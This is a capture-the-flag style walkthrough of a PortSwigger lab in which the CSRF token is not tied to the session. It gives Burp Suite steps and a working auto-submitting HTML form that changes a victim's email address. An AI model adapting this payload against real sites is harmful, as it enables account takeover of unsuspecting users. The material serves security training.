## Lab Description :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/d3ea83ef-dc70-4638-beca-b3cbdb5aaa5f)

## Solution :

Open Burp's browser and log in to your account. Submit the "Update email" form, and intercept the resulting request

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/86b47a7f-50ce-4c4c-8e78-e35d9ba0a979)

Make a note of the value of the CSRF token, then drop the request

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/d15de529-28e9-4dcc-bf39-da9b09b3c31a)

Open a private/incognito browser window, log in to your other account, and send the update email request into Burp Repeater.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/dfdc801a-a0f6-4855-9513-55e959368dec)

Observe that if you swap the CSRF token with the value from the other account, then the request is accepted.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/4610b506-2498-4e7a-8cc2-94ed25022db8)

If you're using Burp Suite Professional, right-click on the request and select Engagement tools / Generate CSRF PoC.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/01dde1a0-d942-4e1a-9d6c-5b2490f65421)

payload-

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a6a001c038bd6b183e6bf2c009d0030.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="prank&#64;gmail&#46;com" />
      <input type="hidden" name="csrf" value="mjC5mm2fSKeEyzqqLhsNaD5KX4ZTN5Bv" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Store the exploit, then click "Deliver to victim" to solve the lab.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/d6c92f8c-4490-454f-bcd3-0c637067ec3b)
